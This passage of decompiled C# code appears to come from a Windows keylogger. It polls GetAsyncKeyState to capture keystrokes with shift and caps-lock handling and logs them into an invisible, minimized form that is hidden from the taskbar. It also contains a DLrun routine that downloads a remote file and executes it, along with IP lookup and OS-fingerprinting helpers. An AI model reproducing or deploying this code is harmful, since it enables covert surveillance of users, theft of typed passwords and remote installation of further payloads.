      this.addKey = (object) "*";
      goto label_244;
label_222:
      num3 = 359;
      this.addKey = (object) "(";
      goto label_244;
label_223:
      num3 = 362;
      this.addKey = (object) ")";
      goto label_244;
label_224:
      num3 = 365;
label_225:
      num3 = 366;
      this.addKey = (object) Strings.Chr(Conversions.ToInteger(this.i));
      goto label_244;
label_227:
      num3 = 371;
      if (ObjectFlowControl.ForLoopControl.ForNextCheckObj(this.i, LoopForResult1, ref this.i))
        goto label_210;
label_228:
      num3 = 372;
      object LoopForResult2;
      if (!ObjectFlowControl.ForLoopControl.ForLoopInitObj(this.i, (object) 65, (object) 128, (object) 1, ref LoopForResult2, ref this.i))
        goto label_243;
label_229:
      num3 = 373;
      this.keyPressed = (object) Form1.GetAsyncKeyState(Conversions.ToInteger(this.i));
label_230:
      num3 = 374;
      if (!Operators.ConditionalCompareObjectEqual(this.keyPressed, (object) -32767, false))
        goto label_242;
label_231:
      num3 = 375;
      if (this.getShift())
        goto label_236;
label_232:
      num3 = 376;
      if (!this.getCapslock())
        goto label_234;
label_233:
      num3 = 377;
      this.addKey = (object) Strings.UCase(Strings.Chr(Conversions.ToInteger(this.i)));
      goto label_244;
label_234:
      num3 = 379;
label_235:
      num3 = 380;
      this.addKey = (object) Strings.LCase(Strings.Chr(Conversions.ToInteger(this.i)));
      goto label_244;
label_236:
      num3 = 383;
label_237:
      num3 = 384;
      if (this.getCapslock())
        goto label_239;
label_238:
      num3 = 385;
      this.addKey = (object) Strings.UCase(Strings.Chr(Conversions.ToInteger(this.i)));
      goto label_244;
label_239:
      num3 = 387;
label_240:
      num3 = 388;
      this.addKey = (object) Strings.LCase(Strings.Chr(Conversions.ToInteger(this.i)));
      goto label_244;
label_242:
      num3 = 394;
      if (ObjectFlowControl.ForLoopControl.ForNextCheckObj(this.i, LoopForResult2, ref this.i))
        goto label_229;
label_243:
      num3 = 395;
      Application.DoEvents();
      goto label_256;
label_244:
      num3 = 397;
      if (this.charCount <= this.lineLimit)
        goto label_247;
label_245:
      num3 = 398;
      this.charCount = 0;
label_246:
      num3 = 399;
      this.TextBox1.AppendText("\r\n");
label_247:
      num3 = 401;
      if (!Operators.ConditionalCompareObjectNotEqual(this.addKey, (object) "", false))
        goto label_249;
label_248:
      num3 = 402;
      this.TextBox1.AppendText(Conversions.ToString(this.addKey));
label_249:
      num3 = 404;
      Application.DoEvents();
      goto label_256;
label_251:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
            case 5:
              goto label_3;
            case 6:
              goto label_4;
            case 7:
              goto label_5;
            case 8:
              goto label_6;
            case 9:
              goto label_7;
            case 10:
            case 16:
            case 22:
            case 27:
            case 34:
            case 37:
            case 38:
            case 45:
            case 48:
            case 49:
            case 56:
            case 59:
            case 60:
            case 67:
            case 70:
            case 71:
            case 78:
            case 81:
            case 82:
            case 89:
            case 92:
            case 93:
            case 100:
            case 103:
            case 104:
            case 111:
            case 114:
            case 115:
            case 122:
            case 125:
            case 126:
            case 133:
            case 136:
            case 137:
            case 144:
            case 147:
            case 148:
            case 155:
            case 158:
            case 159:
            case 166:
            case 169:
            case 170:
            case 177:
            case 180:
            case 181:
            case 188:
            case 191:
            case 192:
            case 199:
            case 202:
            case 203:
            case 210:
            case 213:
            case 214:
            case 222:
            case 225:
            case 226:
            case 232:
            case 235:
            case 236:
            case 242:
            case 248:
            case 251:
            case 252:
            case 259:
            case 262:
            case 263:
            case 269:
            case 276:
            case 279:
            case 280:
            case 287:
            case 290:
            case 291:
            case 298:
            case 301:
            case 302:
            case 309:
            case 312:
            case 313:
            case 320:
            case 323:
            case 324:
            case 332:
            case 336:
            case 339:
            case 342:
            case 345:
            case 348:
            case 351:
            case 354:
            case 357:
            case 360:
            case 363:
            case 364:
            case 367:
            case 368:
            case 378:
            case 381:
            case 382:
            case 386:
            case 389:
            case 390:
            case 391:
            case 397:
              goto label_244;
            case 11:
            case 12:
              goto label_8;
            case 13:
              goto label_9;
            case 14:
              goto label_10;
            case 15:
              goto label_11;
            case 17:
            case 18:
              goto label_12;
            case 19:
              goto label_13;
            case 20:
              goto label_14;
            case 21:
              goto label_15;
            case 23:
            case 24:
              goto label_16;
            case 25:
              goto label_17;
            case 26:
              goto label_18;
            case 28:
              num3 = 28;
              checked { ++this.charCount; }
              goto label_20;
            case 29:
            case 30:
              goto label_20;
            case 31:
              goto label_21;
            case 32:
              goto label_22;
            case 33:
              goto label_23;
            case 35:
              goto label_24;
            case 36:
              goto label_25;
            case 39:
              num3 = 39;
              checked { ++this.charCount; }
              goto label_27;
            case 40:
            case 41:
              goto label_27;
            case 42:
              goto label_28;
            case 43:
              goto label_29;
            case 44:
              goto label_30;
            case 46:
              goto label_31;
            case 47:
              goto label_32;
            case 50:
              num3 = 50;
              checked { ++this.charCount; }
              goto label_34;
            case 51:
            case 52:
              goto label_34;
            case 53:
              goto label_35;
            case 54:
              goto label_36;
            case 55:
              goto label_37;
            case 57:
              goto label_38;
            case 58:
              goto label_39;
            case 61:
              num3 = 61;
              checked { ++this.charCount; }
              goto label_41;
            case 62:
            case 63:
              goto label_41;
            case 64:
              goto label_42;
            case 65:
              goto label_43;
            case 66:
              goto label_44;
            case 68:
              goto label_45;
            case 69:
              goto label_46;
            case 72:
              num3 = 72;
              checked { ++this.charCount; }
              goto label_48;
            case 73:
            case 74:
              goto label_48;
            case 75:
              goto label_49;
            case 76:
              goto label_50;
            case 77:
              goto label_51;
            case 79:
              goto label_52;
            case 80:
              goto label_53;
            case 83:
              num3 = 83;
              checked { ++this.charCount; }
              goto label_55;
            case 84:
            case 85:
              goto label_55;
            case 86:
              goto label_56;
            case 87:
              goto label_57;
            case 88:
              goto label_58;
            case 90:
              goto label_59;
            case 91:
              goto label_60;
            case 94:
              num3 = 94;
              checked { ++this.charCount; }
              goto label_62;
            case 95:
            case 96:
              goto label_62;
            case 97:
              goto label_63;
            case 98:
              goto label_64;
            case 99:
              goto label_65;
            case 101:
              goto label_66;
            case 102:
              goto label_67;
            case 105:
              num3 = 105;
              checked { ++this.charCount; }
              goto label_69;
            case 106:
            case 107:
              goto label_69;
            case 108:
              goto label_70;
            case 109:
              goto label_71;
            case 110:
              goto label_72;
            case 112:
              goto label_73;
            case 113:
              goto label_74;
            case 116:
              num3 = 116;
              checked { ++this.charCount; }
              goto label_76;
            case 117:
            case 118:
              goto label_76;
            case 119:
              goto label_77;
            case 120:
              goto label_78;
            case 121:
              goto label_79;
            case 123:
              goto label_80;
            case 124:
              goto label_81;
            case (int) sbyte.MaxValue:
              num3 = (int) sbyte.MaxValue;
              checked { ++this.charCount; }
              goto label_83;
            case 128:
            case 129:
              goto label_83;
            case 130:
              goto label_84;
            case 131:
              goto label_85;
            case 132:
              goto label_86;
            case 134:
              goto label_87;
            case 135:
              goto label_88;
            case 138:
              num3 = 138;
              checked { ++this.charCount; }
              goto label_90;
            case 139:
            case 140:
              goto label_90;
            case 141:
              goto label_91;
            case 142:
              goto label_92;
            case 143:
              goto label_93;
            case 145:
              goto label_94;
            case 146:
              goto label_95;
            case 149:
              num3 = 149;
              checked { ++this.charCount; }
              goto label_97;
            case 150:
            case 151:
              goto label_97;
            case 152:
              goto label_98;
            case 153:
              goto label_99;
            case 154:
              goto label_100;
            case 156:
              goto label_101;
            case 157:
              goto label_102;
            case 160:
              num3 = 160;
              checked { ++this.charCount; }
              goto label_104;
            case 161:
            case 162:
              goto label_104;
            case 163:
              goto label_105;
            case 164:
              goto label_106;
            case 165:
              goto label_107;
            case 167:
              goto label_108;
            case 168:
              goto label_109;
            case 171:
              num3 = 171;
              checked { ++this.charCount; }
              goto label_111;
            case 172:
            case 173:
              goto label_111;
            case 174:
              goto label_112;
            case 175:
              goto label_113;
            case 176:
              goto label_114;
            case 178:
              goto label_115;
            case 179:
              goto label_116;
            case 182:
              num3 = 182;
              checked { ++this.charCount; }
              goto label_118;
            case 183:
            case 184:
              goto label_118;
            case 185:
              goto label_119;
            case 186:
              goto label_120;
            case 187:
              goto label_121;
            case 189:
              goto label_122;
            case 190:
              goto label_123;
            case 193:
              num3 = 193;
              checked { ++this.charCount; }
              goto label_125;
            case 194:
            case 195:
              goto label_125;
            case 196:
              goto label_126;
            case 197:
              goto label_127;
            case 198:
              goto label_128;
            case 200:
              goto label_129;
            case 201:
              goto label_130;
            case 204:
              num3 = 204;
              checked { ++this.charCount; }
              goto label_132;
            case 205:
            case 206:
              goto label_132;
            case 207:
              goto label_133;
            case 208:
              goto label_134;
            case 209:
              goto label_135;
            case 211:
              goto label_136;
            case 212:
              goto label_137;
            case 215:
              num3 = 215;
              checked { ++this.charCount; }
              goto label_139;
            case 216:
            case 217:
              goto label_139;
            case 218:
              goto label_140;
            case 219:
              goto label_141;
            case 220:
              goto label_142;
            case 221:
              goto label_143;
            case 223:
              goto label_144;
            case 224:
              goto label_145;
            case 227:
            case 228:
              goto label_146;
            case 229:
              goto label_147;
            case 230:
              goto label_148;
            case 231:
              goto label_149;
            case 233:
              goto label_150;
            case 234:
              goto label_151;
            case 237:
              num3 = 237;
              checked { ++this.charCount; }
              goto label_153;
            case 238:
            case 239:
              goto label_153;
            case 240:
              goto label_154;
            case 241:
              goto label_155;
            case 243:
            case 244:
              goto label_156;
            case 245:
              goto label_157;
            case 246:
              goto label_158;
            case 247:
              goto label_159;
            case 249:
              goto label_160;
            case 250:
              goto label_161;
            case 253:
              num3 = 253;
              checked { ++this.charCount; }
              goto label_163;
            case 254:
            case (int) byte.MaxValue:
              goto label_163;
            case 256:
              goto label_164;
            case 257:
              goto label_165;
            case 258:
              goto label_166;
            case 260:
              goto label_167;
            case 261:
              goto label_168;
            case 264:
              num3 = 264;
              checked { ++this.charCount; }
              goto label_170;
            case 265:
            case 266:
              goto label_170;
            case 267:
              goto label_171;
            case 268:
              goto label_172;
            case 270:
              num3 = 270;
              checked { ++this.charCount; }
              goto label_174;
            case 271:
            case 272:
              goto label_174;
            case 273:
              goto label_175;
            case 274:
              goto label_176;
            case 275:
              goto label_177;
            case 277:
              goto label_178;
            case 278:
              goto label_179;
            case 281:
              num3 = 281;
              checked { ++this.charCount; }
              goto label_181;
            case 282:
            case 283:
              goto label_181;
            case 284:
              goto label_182;
            case 285:
              goto label_183;
            case 286:
              goto label_184;
            case 288:
              goto label_185;
            case 289:
              goto label_186;
            case 292:
              num3 = 292;
              checked { ++this.charCount; }
              goto label_188;
            case 293:
            case 294:
              goto label_188;
            case 295:
              goto label_189;
            case 296:
              goto label_190;
            case 297:
              goto label_191;
            case 299:
              goto label_192;
            case 300:
              goto label_193;
            case 303:
              num3 = 303;
              checked { ++this.charCount; }
              goto label_195;
            case 304:
            case 305:
              goto label_195;
            case 306:
              goto label_196;
            case 307:
              goto label_197;
            case 308:
              goto label_198;
            case 310:
              goto label_199;
            case 311:
              goto label_200;
            case 314:
              num3 = 314;
              checked { ++this.charCount; }
              goto label_202;
            case 315:
            case 316:
              goto label_202;
            case 317:
              goto label_203;
            case 318:
              goto label_204;
            case 319:
              goto label_205;
            case 321:
              goto label_206;
            case 322:
              goto label_207;
            case 325:
              num3 = 325;
              checked { ++this.charCount; }
              goto label_209;
            case 326:
            case 327:
              goto label_209;
            case 328:
              goto label_210;
            case 329:
              goto label_211;
            case 330:
              goto label_212;
            case 331:
              goto label_213;
            case 333:
            case 335:
              goto label_214;
            case 337:
            case 338:
              goto label_215;
            case 340:
            case 341:
              goto label_216;
            case 343:
            case 344:
              goto label_217;
            case 346:
            case 347:
              goto label_218;
            case 349:
            case 350:
              goto label_219;
            case 352:
            case 353:
              goto label_220;
            case 355:
            case 356:
              goto label_221;
            case 358:
            case 359:
              goto label_222;
            case 361:
            case 362:
              goto label_223;
            case 365:
              goto label_224;
            case 366:
              goto label_225;
            case 369:
              num3 = 369;
              checked { ++this.charCount; }
              goto label_227;
            case 370:
            case 371:
              goto label_227;
            case 372:
              goto label_228;
            case 373:
              goto label_229;
            case 374:
              goto label_230;
            case 375:
              goto label_231;
            case 376:
              goto label_232;
            case 377:
              goto label_233;
            case 379:
              goto label_234;
            case 380:
              goto label_235;
            case 383:
              goto label_236;
            case 384:
              goto label_237;
            case 385:
              goto label_238;
            case 387:
              goto label_239;
            case 388:
              goto label_240;
            case 392:
              num3 = 392;
              checked { ++this.charCount; }
              goto label_242;
            case 393:
            case 394:
              goto label_242;
            case 395:
              goto label_243;
            case 396:
            case 405:
              goto label_256;
            case 398:
              goto label_245;
            case 399:
              goto label_246;
            case 400:
            case 401:
              goto label_247;
            case 402:
              goto label_248;
            case 403:
            case 404:
              goto label_249;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_251;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_256:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private IPAddress GetMyIP()
  {
    using (WebClient webClient = new WebClient())
      return IPAddress.Parse(Encoding.ASCII.GetString(webClient.DownloadData("http://automation.whatismyip.com/n09230945.asp")));
  }

  public static string GenerateOperatingSystem()
  {
    OperatingSystem osVersion = Environment.OSVersion;
    string operatingSystem = "UN";
    switch (osVersion.Platform)
    {
      case PlatformID.Win32Windows:
        switch (osVersion.Version.Minor)
        {
          case 0:
            operatingSystem = "95";
            break;
          case 10:
            operatingSystem = "98";
            break;
          case 90:
            operatingSystem = "ME";
            break;
        }
        break;
      case PlatformID.Win32NT:
        switch (osVersion.Version.Major)
        {
          case 3:
            operatingSystem = "NT";
            break;
          case 4:
            operatingSystem = "NT";
            break;
          case 5:
            if (osVersion.Version.Minor == 0)
            {
              operatingSystem = "2K";
              break;
            }
            if (osVersion.Version.Minor == 1)
            {
              operatingSystem = "XP";
              break;
            }
            if (osVersion.Version.Minor == 2)
            {
              operatingSystem = "2K3";
              break;
            }
            break;
          case 6:
            operatingSystem = "VS";
            if (osVersion.Version.Minor == 0)
            {
              operatingSystem = "VS";
              break;
            }
            if (osVersion.Version.Minor == 1)
            {
              operatingSystem = "W7";
              break;
            }
            break;
        }
        break;
    }
    return operatingSystem;
  }

  private bool DLrun(string DLfrom, string saveto)
  {
    if (MyProject.Computer.FileSystem.FileExists(saveto))
      FileSystem.Kill(saveto);
    bool flag;
    try
    {
      MyProject.Computer.Network.DownloadFile(DLfrom, saveto);
      Process.Start(saveto);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
      goto label_5;
    }
    return true;
label_5:
    return flag;
  }

  public int GetRandom(int Min, int Max) => new Random().Next(Min, Max);

  private static string ScrambleKey(string v_strKey)
  {
    StringBuilder stringBuilder = new StringBuilder();
    int length = v_strKey.Length;
    int num = 1;
    while (num <= length)
    {
      int Start = checked (v_strKey.Length - num + 1);
      stringBuilder.Append(Strings.Mid(v_strKey, Start, 1));
      checked { ++num; }
    }
    stringBuilder.ToString();
    return stringBuilder.ToString();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.components == null)
        return;
      this.components.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.components = (IContainer) new System.ComponentModel.Container();
    this.Timer1 = new System.Windows.Forms.Timer(this.components);
    this.Timer2 = new System.Windows.Forms.Timer(this.components);
    this.TextBox1 = new TextBox();
    this.SuspendLayout();
    this.Timer2.Interval = 1;
    this.TextBox1.Location = new Point(12, 12);
    this.TextBox1.MaxLength = 327670000;
    this.TextBox1.Multiline = true;
    this.TextBox1.Name = "TextBox1";
    TextBox textBox1 = this.TextBox1;
    Size size1 = new Size(260, 238);
    Size size2 = size1;
    textBox1.Size = size2;
    this.TextBox1.TabIndex = 0;
    this.TextBox1.WordWrap = false;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    size1 = new Size(284, 262);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.TextBox1);
    this.Name = nameof (Form1);
    this.Opacity = 0.0;
    this.ShowIcon = false;
    this.ShowInTaskbar = false;
    this.Text = nameof (Form1);
    this.WindowState = FormWindowState.Minimized;
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual System.Windows.Forms.Timer Timer1
  {
    get => this._Timer1;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (this._Timer1 != null)
        this._Timer1.Tick -= new EventHandler(this.Timer1_Tick);
      this._Timer1 = value;
      if (this._Timer1 == null)
        return;
      this._Timer1.Tick += new EventHandler(this.Timer1_Tick);
    }
  }

  internal virtual System.Windows.Forms.Timer Timer2
  {
    get => this._Timer2;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (this._Timer2 != null)
        this._Timer2.Tick -= new EventHandler(this.Timer2_Tick);
      this._Timer2 = value;
      if (this._Timer2 == null)
        return;
      this._Timer2.Tick += new EventHandler(this.Timer2_Tick);
    }
  }

  internal virtual TextBox TextBox1
  {
    get => this._TextBox1;
    [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
  }
}
